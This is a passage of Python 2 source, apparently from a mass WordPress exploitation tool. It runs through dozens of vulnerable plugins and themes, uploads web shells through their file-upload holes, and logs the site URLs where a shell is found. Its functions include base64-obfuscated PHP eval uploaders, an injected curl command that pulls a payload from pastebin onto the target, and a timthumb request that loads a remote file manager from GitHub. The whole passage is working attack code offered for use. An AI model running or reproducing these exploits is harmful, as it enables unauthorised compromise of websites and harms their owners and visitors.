		req = requests.post(host+'/wp-content/plugins/google-maps-by-daniel-martyn/inuse.php', files=files)

		
		
		lib = requests.get(host+"/wp-content/plugins/google-maps-by-daniel-martyn/version.php")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}google-maps eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('option-seo.txt', 'a').write(host+'/wp-content/plugins/google-maps-by-daniel-martyn/version.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}google-maps Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		
		

def izop(host):


	try:
	
	
		host = host.strip()
		
		post = {'wsecure_action': 'update','publish': '";} echo "izocin was here."; class WSecureConfig2 {var $test="'}
		

		req = requests.post(host+'/wp-content/plugins/wsecure/wsecure-config.php', data=post)

		
		
		lib = requests.get(host+"/wp-content/plugins/wsecure/params.php")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}wsecure eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('calendar.txt', 'a').write(host+'/wp-content/plugins/wsecure/params.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}wsecure Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		

def evez(host):


	try:
	
	
		host = host.strip()
		
		
		files = {'files': (filec, shell, 'text/html')}

		req = requests.post(host+'/wp-content/plugins/php-event-calendar/server/file-uploader/', files=files)

		
		
		lib = requests.get(host+"/wp-content/plugins/php-event-calendar/server/file-uploader/izo.php")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}calendar2 eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('calendar.txt', 'a').write(host+'/wp-content/plugins/php-event-calendar/server/file-uploader/izo.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}calendar2 Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		

def alpx(host):


	try:
	
	
		host = host.strip()
		
		
		files = {'attachment_file': (filec, shell, 'text/html')}

		req = requests.post(host, files=files)

		
		
		lib = requests.get(host+"/wp-content/uploads/izo.php")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}allpost-contact eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('allpost-contact.txt', 'a').write(host+'/wp-content/uploads/izo.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}allpost-contact Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		

def bcpx(host):


	try:
	
	
		host = host.strip()
		
		post = {'action': 'send_enquiry_mail'}
		
		files = {'fileupload[0]': (filec, shell, 'text/html')}

		req = requests.post(host+'/wp-admin/admin-ajax.php', files=files,data=post)

		
		
		lib = requests.get(host+"/wp-content/uploads/catalog_enquiry/izo.php")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}catalogenquiry eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('catalog_enquiry.txt', 'a').write(host+'/wp-content/uploads/catalog_enquiry/izo.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}catalogenquiry Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		

def chis(host):


	try:
	
	
		host = host.strip()
		
		headers = {'Content-Type': 'text/plain'}
		
		req = requests.post(host+'/wp-content/plugins/web-tripwire/includes/ofc/ofc_upload_image.php?name=izo.php',data=shell,headers=headers)

			
		lib = requests.get(host+"/wp-content/plugins/web-tripwire/includes/tmp-upload-images/izo.php")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}web-tripwire eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('web-tripwire.txt', 'a').write(host+'/wp-content/plugins/web-tripwire/includes/tmp-upload-images/izo.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}web-tripwire Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		

def spat(host):


	try:
	
	
		host = host.strip()
		
		headers = {'Content-Type': 'text/plain'}
		
		req = requests.post(host+'/wp-content/plugins/spamtask/chart/php-ofc-library/ofc_upload_image.php?name=izo.php',data=shell,headers=headers)

			
		lib = requests.get(host+"/wp-content/plugins/spamtask/chart/tmp-upload-images/izo.php")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}spamtask eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('spamtask.txt', 'a').write(host+'/wp-content/plugins/spamtask/chart/tmp-upload-images/izo.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}spamtask Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		

def rexo(host):


	try:
	
	
		host = host.strip()
		
		headers = {'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0','Accept'     : '*/*'}
		
		post = {'action' : 'revslider_ajax_action', 'client_action' : 'update_plugin'}
		
		files = {'update_file': (filename, shell, 'text/html')}

		req = requests.post(host+'/wp-admin/admin-ajax.php', headers = headers, data = post, files = files)

		
		
		lib = requests.get(host+"/wp-content/plugins/revslider/temp/update_extract/" + filename)
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}Revs Sjhell Up eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('revslidershell.txt', 'a').write(host+'/wp-content/plugins/revslider/temp/update_extract/'+filename+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}Revs Shell Up Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		
		

def xwyz(host):


	try:
	
	
		host = host.strip()
		
		post = {'action': 'frm_forms_preview','form': "{'contact-form'}",'before_html': "[su_meta key=1 post_id=1 default='curl https://pastebin.com/raw/cq1FZ2pK > ../wp-content/upoad.php' filter='system']",'custom_style': '1'}
		

		req = requests.post(host+'/wp-admin/admin-ajax.php?action=create', data=post)

		
		
		lib = requests.get(host+"/wp-content/upload.php")
		
		
		if 'SangPujaan' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}Formidable eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('Formidable.txt', 'a').write(host+'/wp-content/upload.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}Formidable Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		

def xwab(host):


	try:
	
	
		host = host.strip()
		

		
		
		lib = requests.get(host+"/timthumb.php?src=https://raw.githubusercontent.com/Theanvenger/Tryag-File-Manager-jpeg/master/0up.php")
				
		if '/cache/' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}Timthumb eXploiting{}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('Timthumb.txt', 'a').write(host+'/timthumb.php?src=https://raw.githubusercontent.com/Theanvenger/Tryag-File-Manager-jpeg/master/0up.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}Timthumb Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		
		
def avso(host):


	try:
	
	
		host = host.strip()
		
		
		
		files = {'qqfile': (filec, shell, 'text/html')}

		req = requests.post(host+'/wp-content/plugins/awesome-support/plugins/jquery.fineuploader-3.5.0/server/php/example.php', files = files)

		
		
		lib = requests.get(host+"/wp-content/plugins/awesome-support/plugins/jquery.fineuploader-3.5.0/server/php/izo.php")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}awesome-support eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('awesome-support.txt', 'a').write(host+'/wp-content/plugins/awesome-support/plugins/jquery.fineuploader-3.5.0/server/php/izo.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}awesome-support Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		
		
def brai(host):


	try:
	
	
		host = host.strip()
		
		
		
		files = {'Filedata': (filec, shell, 'text/html')}

		req = requests.post(host+'/wp-content/themes/brainstorm/functions/scripts/uploadify.php', files = files)

		
		
		lib = requests.get(host+"/wp-content/uploads/2018/01/izo.php")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}brainstorm eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('brainstorm.txt', 'a').write(host+'/wp-content/uploads/2018/01/izo.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}brainstorm Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		
		
def ghos(host):


	try:
	
	
		host = host.strip()
		
		
		
		files = {'Filedata': (filec, shell, 'text/html')}

		req = requests.post(host+'/wp-content/themes/Ghost/includes/uploadify/upload_settings_image.php', files = files)

		
		
		lib = requests.get(host+"/wp-content/uploads/settingsimages/izo.php")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}Ghost eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('ghosttemashell.txt', 'a').write(host+'/wp-content/uploads/settingsimages/izo.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}Ghost Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		
		

def syno(host):


	try:
	
	
		host = host.strip()
		
		
		
		files = {'qqfile': (filec, shell, 'text/html')}

		req = requests.post(host+'/wp-content/themes/synoptic/lib/avatarupload/upload.php', files = files)

		
		
		lib = requests.get(host+"/wp-content/uploads/markets/avatars/izo.php")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}synoptic eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('synoptictemashell.txt', 'a').write(host+'/wp-content/uploads/markets/avatars/izo.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}synoptic Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		

		

def ghob(host):


	try:
	
	
		host = host.strip()
		
		
		
		files = {'file_field': (filey, shell, 'text/html')}

		req = requests.post(host+'/wp-content/plugins/dzs-zoomsounds/admin/upload.php', files = files)

		
		
		lib = requests.get(host+"/wp-content/plugins/dzs-zoomsounds/admin/upload/izo.PHtml")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}dzs-zoomsounds eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('dzs-zoomsounds.txt', 'a').write(host+'/wp-content/plugins/dzs-zoomsounds/admin/upload/izo.PHtml'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}dzs-zoomsounds Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		
		
def ecba(host):


	try:
	
	
		host = host.strip()
		
		
		
		files = {'orange_themes': (filec, shell, 'text/html')}

		req = requests.post(host+'/wp-content/themes/echelon/lib/admin/functions/nedia-upload.php', files = files)

		
		
		lib = requests.get(host+"/wp-content/uploads/2018/01/izo.php")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}echelon eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('echelon.txt', 'a').write(host+'/wp-content/uploads/2018/01/izo.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}echelon Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		
		

def ecbt(host):


	try:
	
	
		host = host.strip()
		
		post = {'name' : 'izom.shtml','room' : '.'}
		
		files = {'vw_file': (filet, shell, 'text/html')}

		req = requests.post(host+'/wp-content/plugins/videowhisper-video-presentation/vp/vw_upload.php',data=post, files = files)

		
		
		lib = requests.get(host+"/wp-content/plugins/videowhisper-video-presentation/vc/uploads/izom.shtml")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}videowhisper presentation eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('videowhisper.txt', 'a').write(host+'/wp-content/plugins/videowhisper-video-presentation/vc/uploads/izom.shtml'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}videowhisper presentation Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass


def ecbn(host):


	try:
	
	
		host = host.strip()
		
		post = {'name' : 'izom.shtml','room' : '.'}
		
		files = {'vw_file': (filet, shell, 'text/html')}

		req = requests.post(host+'/wp-content/plugins/videowhisper-video-conference-integration/vp/vw_upload.php',data=post, files = files)

		
		
		lib = requests.get(host+"/wp-content/plugins/videowhisper-video-conference-integration/vc/uploads/izom.shtml")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}videowhisper integration eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('videowhisper.txt', 'a').write(host+'/wp-content/plugins/videowhisper-video-conference-integration/vc/uploads/izom.shtml'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}videowhisper integration Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass

		
def ecob(host):


	try:
	
	
		host = host.strip()
		
		
		
		files = {'files[]': (filec, shell, 'text/html')}

		req = requests.post(host+'/wp-admin/admin-ajax.php?action=load_ajax_function', files = files)

		
		
		lib = requests.get(host+"/wp-content/uploads/files/guest/izo.php")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}load_ajax eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('load_ajax.txt', 'a').write(host+'/wp-content/uploads/files/guest/izo.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}load_ajax Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		
		

def chiz(host):


	try:
	
	
		host = host.strip()
		
		headers = {'Content-Type': 'application/octet-stream'}
		
		req = requests.post(host+'/wp-content/plugins/invit0r/lib/php-ofc-library/ofc_upload_image.php?name=izo.php',data=shell,headers=headers)

			
		lib = requests.get(host+"/wp-content/plugins/invit0r/lib/php-ofc-library/izo.php")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}invit0r eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('invit0r.txt', 'a').write(host+'/wp-content/plugins/invit0r/lib/php-ofc-library/izo.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}invit0r Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		

def ecvh(host):


	try:
	
	
		host = host.strip()
		
		post = {'action' : 'nm_webcontact_upload_file','name' : 'upload.php'}
		
		files = {'file': (shell, 'text/html')}

		req = requests.post(host+'/wp-admin/admin-ajax.php',data=post, files = files)

		
		lib = requests.get(host+"/wp-content/uploads/contact_files/upload.php")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}N-Media contact eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('N-Media-contact.txt', 'a').write(host+'/wp-content/uploads/contact_files/upload.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}N-Media contact Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass


def ecvf(host):


	try:
	
	
		host = host.strip()
		
		post = {'action' : 'nm_postfront_upload_file','name' : 'upload.php'}
		
		files = {'file': (shell, 'text/html')}

		req = requests.post(host+'/wp-admin/admin-ajax.php',data=post, files = files)

		
		lib = requests.get(host+"/wp-content/uploads/post_files/upload.php")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}N-Media Post eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('N-Media-post.txt', 'a').write(host+'/wp-content/uploads/post_files/upload.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}N-Media Post Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass


def ecor(host):


	try:
	
	
		host = host.strip()
		
		
		
		files = {'popimg': (filec, shell, 'text/html')}

		req = requests.post(host+'/wp-admin/admin-ajax.php?action=getcountryuser&cs=2', files = files)

		
		
		lib = requests.get(host+"/wp-content/uploads/2018/01/izo.php")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}Adblock Blocker eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('Adblock-Blocker.txt', 'a').write(host+'/wp-content/uploads/2018/01/izo.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}Adblock Blocker Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		
		

def assr(host):


	try:
	
	
		host = host.strip()
		
		
		
		files = {'Filedata': (filec, shell, 'text/html')}

		req = requests.post(host+'/wp-content/plugins/asset-manager/upload.php', files = files)

		
		
		lib = requests.get(host+"/wp-content/uploads/assets/temp/izo.php")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}asset-manager eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('asset-manager.txt', 'a').write(host+'/wp-content/uploads/assets/temp/izo.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}asset-manager Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		
		

def ecvb(host):


	try:
	
	
		host = host.strip()
		
		post = {'folder' : '/test/'}
		
		files = {'file': (filec,shell, 'text/html')}

		req = requests.post(host+'/wp-content/plugins/wordpress-member-private-conversation/doupload.php',data=post, files = files)

		
		lib = requests.get(host+"/wp-content/uploads/user_uploads/test/izo.php")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}private-conversation eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('private-conversation.txt', 'a').write(host+'/wp-content/uploads/user_uploads/test/izo.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}private-conversation Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass


def ahab(host):


	try:
	
	
		host = host.strip()
		
		post = {"install" : '<?php eval(bAsE64_DecOde("ZWNobyAnaXpvY2luPGJyPicucGhwX3VuYW1lKCkuJzxmb3JtIG1ldGhvZD0icG9zdCIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSI+Jy4nPGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImZpbGUiPjxpbnB1dCBuYW1lPSJfdXBsIiB0eXBlPSJzdWJtaXQiPjwvZm9ybT4nOwppZiggJF9QT1NUWydfdXBsJ10gKXtpZihAY29weSgkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ10sICRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKSkgeyBlY2hvICdVcGxvYWQgT0snO31lbHNlIHtlY2hvICdVcGxvYWQgRmFpbCc7fX0="));?>'}
		

		req = requests.post(host+'/wp-content/plugins/stats-wp/setup.php',data=post)

		
		
		lib = requests.get(host+"/wp-content/plugins/stats-wp/setup.php")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}stats-wp eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('stats-wp.txt', 'a').write(host+'/wp-content/plugins/stats-wp/setup.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}stats-wp Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		

def ahad(host):


	try:
	
	
		host = host.strip()
		
		post = {"newins" : '<?php eval(bAsE64_DecOde("ZWNobyAnaXpvY2luPGJyPicucGhwX3VuYW1lKCkuJzxmb3JtIG1ldGhvZD0icG9zdCIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSI+Jy4nPGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImZpbGUiPjxpbnB1dCBuYW1lPSJfdXBsIiB0eXBlPSJzdWJtaXQiPjwvZm9ybT4nOwppZiggJF9QT1NUWydfdXBsJ10gKXtpZihAY29weSgkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ10sICRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKSkgeyBlY2hvICdVcGxvYWQgT0snO31lbHNlIHtlY2hvICdVcGxvYWQgRmFpbCc7fX0="));?>'}
		

		req = requests.post(host+'/wp-content/plugins/social-sharing/setup.php',data=post)

		
		
		lib = requests.get(host+"/wp-content/plugins/easy-social-sharing/install.php")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}easy-social-sharing eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('easy-social-sharing.txt', 'a').write(host+'/wp-content/plugins/easy-social-sharing/install.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}easy-social-sharing Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		
def ahhk(host):


	try:
	
	
		host = host.strip()
		
		post = {"newins" : '<?php eval(bAsE64_DecOde("ZWNobyAnaXpvY2luPGJyPicucGhwX3VuYW1lKCkuJzxmb3JtIG1ldGhvZD0icG9zdCIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSI+Jy4nPGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImZpbGUiPjxpbnB1dCBuYW1lPSJfdXBsIiB0eXBlPSJzdWJtaXQiPjwvZm9ybT4nOwppZiggJF9QT1NUWydfdXBsJ10gKXtpZihAY29weSgkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ10sICRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKSkgeyBlY2hvICdVcGxvYWQgT0snO31lbHNlIHtlY2hvICdVcGxvYWQgRmFpbCc7fX0="));?>'}
		

		req = requests.post(host+'/wp-content/plugins/custom-lightbox/setup.php',data=post)

		
		
		lib = requests.get(host+"/wp-content/plugins/jquery-lightbox-terensis-wp/uninstall.php")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}custom-lightbox eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('custom-lightbox.txt', 'a').write(host+'/plugins/jquery-lightbox-terensis-wp/uninstall.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}custom-lightbox Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		

def xabc(host):


	try:
	
	
		host = host.strip()
		
		post = {'filename' : '/wp-content/plugins/xerte-online/xertefiles/lo-xerte.php','filedata' : '<?php eval(bAsE64_DecOde("ZWNobyAnaXpvY2luPGJyPicucGhwX3VuYW1lKCkuJzxmb3JtIG1ldGhvZD0icG9zdCIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSI+Jy4nPGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImZpbGUiPjxpbnB1dCBuYW1lPSJfdXBsIiB0eXBlPSJzdWJtaXQiPjwvZm9ybT4nOwppZiggJF9QT1NUWydfdXBsJ10gKXtpZihAY29weSgkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ10sICRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKSkgeyBlY2hvICdVcGxvYWQgT0snO31lbHNlIHtlY2hvICdVcGxvYWQgRmFpbCc7fX0="));?>'}
		

		req = requests.post(host+'/wp-content/plugins/xerte-online/xertefiles/save.php',data=post)

		
		
		lib = requests.get(host+"/wp-content/plugins/xerte-online/xertefiles/lo-xerte.php")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}xerte-online eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('xerte-online.txt', 'a').write(host+'/wp-content/plugins/xerte-online/xertefiles/lo-xerte.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}xerte-online Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass


def azbt(host):


	try:
	
	
		host = host.strip()
		
		
		
		files = {'qqfile': (filec, shell, 'text/html')}

		req = requests.post(host+'/wp-content/plugins/flipbook/php.php', files = files)

		
		
		lib = requests.get(host+"/wp-includes/fb-images/izo.php")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}flipbook eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('flipbook.txt', 'a').write(host+'/wp-includes/fb-images/izo.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}flipbook Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		

def xabf(host):


	try:
	
	
		host = host.strip()
		
		post = {'mode' : 'image','myfile': (patxx, shell, 'text/html')}
		
		
		req = requests.post(host+'/wp-content/plugins/contus-hd-flv-player/uploadVideo.php',data=post)

		
		
		lib = requests.get(host+"/wp-content/uploads/18_izo.php.jpg")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}contus-hd-flv-player eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('xerte-online.txt', 'a').write(host+'/wp-content/uploads/18_izo.php.jpg'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}contus-hd-flv-player Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass


def xabl(host):


	try:
	
	
		host = host.strip()
		
		post = {'Filedata': (filec, shell, 'text/html')}
		
		
		req = requests.post(host+'/wp-content/plugins/wpstorecart/php/upload.php',data=post)

		
		
		lib = requests.get(host+"/wp-content/uploads/wpstorecart/izo.php")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}wpstorecart eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('wpstorecart.txt', 'a').write(host+'/wp-content/uploads/wpstorecart/izo.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}wpstorecart Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass


def clay(host):


	try:
	
	
		host = host.strip()
		
		
		files = {'file': (filec, shell, 'text/html')}

		req = requests.post(host+'/wp-content/themes/dance-studio/core/libs/imperavi/tests/file_upload.php', files=files)

		
		
		lib = requests.get(host+"/wp-content/uploads/izo.php")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}dance-studio eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('dance-studio.txt', 'a').write(host+'/wp-content/uploads/izo.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}dance-studio Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		
		

def udeg(host):


	try:
	
	
		host = host.strip()
		
		
		files = {'Filedata': (filec, shell, 'text/html')}

		req = requests.post(host+'/wp-content/themes/u-design/scripts/admin/uploadify/uploadify.php', files=files)

		
		
		lib = requests.get(host+"/wp-content/themes/u-design/scripts/admin/uploadify/izo.php")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}u-design eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('u-design.txt', 'a').write(host+'/wp-content/themes/u-design/scripts/admin/uploadify/izo.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}u-design Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		
		
def barf(host):


	try:
	
	
		host = host.strip()
		
		post = {'folder' : '/wp-content/plugins/barclaycart/uploadify/'}
		
		files = {'Filedata': (filec, shell, 'text/html')}

		req = requests.post(host+'/wp-content/plugins/barclaycart/uploadify/uploadify.php', data=post,files=files)

		
		
		lib = requests.get(host+"/wp-content/plugins/barclaycart/uploadify/izo.php")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}barclaycart eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('barclaycart.txt', 'a').write(host+'/wp-content/plugins/barclaycart/uploadifyy/izo.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}barclaycart Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		
		

def bard(host):


	try:
	
	
		host = host.strip()
		
		
		files = {'wpshop_file': (filec, shell, 'text/html')}

		req = requests.post(host+'/wp-content/plugins/wpshop/includes/ajax.php?elementCode=ajaxUpload', files=files)

		
		
		lib = requests.get(host+"/wp-content/uploads/izo.php")
		
		
		if 'izocin' in lib.content:
			print '\r\r\r{}{}[*] {:<60} : {}{}wpshop eXploiting {}{}'.format(fc, sd, host, fr, sb, fg, fr)
			open('wpshop.txt', 'a').write(host+'/wp-content/uploads/izo.php'+'\n')
		else:
			print '\r\r\r{}{}[*] {:<60} : {}{}wpshop Failed{}{}'.format(fc, sd, host, fw, sb, fg, sd)
			
			

	except:
		pass
		
		

def barm(host):


	try:
	
	
		host = host.strip()
		
		
		files = {'fileToUpload': (filec, shell, 'text/html')}

		req = requests.post(host+'/wp-content/plugins/wp-symposium/js/uploadify/uploadify.php', files=files)

		
		
		lib = requests.get(host+"/wp-content/uploads/izo.php")
		
		
